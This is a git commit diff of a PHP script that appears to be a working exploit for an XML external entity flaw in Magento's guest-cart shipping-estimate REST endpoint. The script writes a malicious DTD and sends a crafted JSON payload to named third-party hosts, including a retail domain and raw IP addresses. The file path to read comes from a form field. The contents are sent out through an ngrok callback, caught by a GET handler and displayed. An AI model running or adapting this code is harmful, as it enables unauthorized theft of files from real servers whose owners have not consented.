58c047544dd9a7cede00b06c9d10bfd6b9739e76
EL7ANAFY <153466248+El7ANAFY-1337@users.noreply.github.com>
2024-07-11 10:24:01 +0300

    Update ComicSting.php

--- ComicSting.php
+++ ComicSting.php
@@ -2,80 +2,108 @@
 <html>
 
 <body>
+
+  <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
+    Name: <input type="text" name="file">
+    <input type="submit">
+  </form>
+
   <?php
-	if ($_SERVER['REQUEST_METHOD'] === "POST") {
-		$file = urldecode($_POST['file']);
-		file_put_contents("dtd.xml", "<!ENTITY % data SYSTEM \"{$file}\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'https://b6e6-156-197-175-68.ngrok-free.app/ComicSting.php?leak=%data;'>\">");
-		$url = "https://116.203.8.81/rest/V1/guest-carts/1/estimate-shipping-methods";
+  function payload_call($path = 'xxe.xml', $target = 'www.dyson.cn')
+  {
+    global $cnext;
+    file_put_contents(
+      'dtd.xml',
+      "
+<!ENTITY % data SYSTEM \"$cnext\">
+<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'https://5751-156-197-181-134.ngrok-free.app/cnext.php?leak=%data;'>\">
+"
+    );
 
-		$payload = array(
-			"address" => array(
-				"totalsCollector" => array(
-					"collectorList" => array(
-						"totalCollector" => array(
-							"sourceData" => array(
-								"data" => "<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM 'https://b6e6-156-197-175-68.ngrok-free.app/dtd.xml'>%sp;%param1;]><r>&exfil;</r>",
-								"dataIsURL" => false,
-								"options" => 1337
-							)
-						)
-					)
-				)
-			)
-		);
+    $payload = array(
+      "address" => array(
+        "totalsCollector" => array(
+          "collectorList" => array(
+            "totalCollector" => array(
+              "sourceData" => array(
+                "data" => "https://5751-156-197-181-134.ngrok-free.app/$path",
+                "dataIsURL" => true,
+                "options" => 1337
+              )
+            )
+          )
+        )
+      )
+    );
 
-		$headers = array(
-			'Content-Type: application/json'
-		);
+    $target = "https://$target/rest/V1/guest-carts/1/estimate-shipping-methods";
+    $headers = array(
+      'Content-Type: application/json'
+    );
 
-		$ch = curl_init($url);
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-		curl_setopt($ch, CURLOPT_POST, true);
-		curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
-		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $ch = curl_init($target);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 
-		$response = curl_exec($ch);
-		$curl_error = curl_error($ch);
+    $response = curl_exec($ch);
+    $curl_error = curl_error($ch);
 
-		if ($curl_error) {
-			echo '<pre>';
-			echo "cURL Error: " . $curl_error;
-			echo '</pre>';
-		}
+    if ($curl_error) {
+      echo '<pre>';
+      echo "cURL Error: " . $curl_error;
+      echo '</pre>';
+    }
 
-		curl_close($ch);
+    print_r($response . '<br><br>');
+    curl_close($ch);
+  }
 
-		// Wait for the leak parameter to be received
-		$leak = '';
-		$timeout = 30; // seconds
-		$interval = 1; // seconds
+  if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $cnext = $_POST['file'];
+    if (empty($cnext)) {
+      echo "file is empty";
+    } else {
+      payload_call('xxe.xml', '3.105.50.154');
 
-		while ($timeout > 0) {
+      // Wait for the leak parameter to be received
+      $leak = '';
+      $timeout = 12; // seconds
+      $interval = 1; // seconds
 
-			if (file_exists("leak.txt") && filesize("leak.txt") > 0) {
-				$leak = file_get_contents("leak.txt");
-				break;
-			}
-			sleep($interval);
-			$timeout -= $interval;
-		}
+      while ($timeout > 0) {
 
-		if ($leak) {
-			echo '<pre>';
-			echo "File contents: " . $leak;
-			echo '</pre>';
-		} else {
-			echo '<pre>';
-			echo "Timed out waiting for leak parameter.";
-			echo '</pre>';
-		}
-	} elseif ($_SERVER['REQUEST_METHOD'] === "GET") {
-		file_put_contents("leak.txt", $_GET['leak']);
-	}
+        if (file_exists("leak") && filesize('leak') > 0) {
+          $leak = file_get_contents("leak");
+          shell_exec('rm -r leak');
+          break;
+        }
+        sleep($interval);
+        $timeout -= $interval;
+      }
 
-	?>
+      if ($leak) {
+        echo '<pre>';
+        echo "File contents: " . $leak;
+        echo '</pre>';
+      } else {
+        echo '<pre>';
+        echo "Timed out waiting for leak parameter.";
+        echo '</pre>';
+      }
+    }
+  }
+
+  if ($_SERVER["REQUEST_METHOD"] == "GET") :
+    file_put_contents('leak', $_GET['leak']);
+  // exec('touch leak', $output);
+  // print_r($output);
+  endif;
+  ?>
+
 </body>
 
 </html>
